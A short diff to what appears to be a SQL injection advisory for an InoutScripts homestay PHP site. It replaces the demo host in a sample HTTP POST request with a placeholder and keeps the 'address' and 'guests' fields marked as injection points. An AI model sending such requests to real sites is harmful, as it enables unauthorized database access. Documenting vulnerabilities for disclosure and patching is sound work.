@@ -31,13 +31,13 @@ Vulnerability File: index.php
 POST /index.php?page=search/rentals HTTP/1.1
 Content-Type: application/x-www-form-urlencoded
 X-Requested-With: XMLHttpRequest
-Referer: http://inout-homestay.demo.inoutscripts.net/
+Referer: http://some-vuln-host.com
 Cookie: currencyid=10; currencycode=BYR; language=2; io_lang_code=es
 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
 Accept-Encoding: gzip,deflate,br
 Content-Length: 189
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4512.0 Safari/537.36
-Host: inout-homestay.demo.inoutscripts.net
+Host: some-vuln-host.com
 Connection: Keep-alive
 address=3[inject_sql_here]&guests=-1[or_inject_sql_here]&indate=01/01/1967&lat=1&location=1&long=1&outdate=01/01/1967&searchcity=San%20Francisco&searchstate=NY
 `
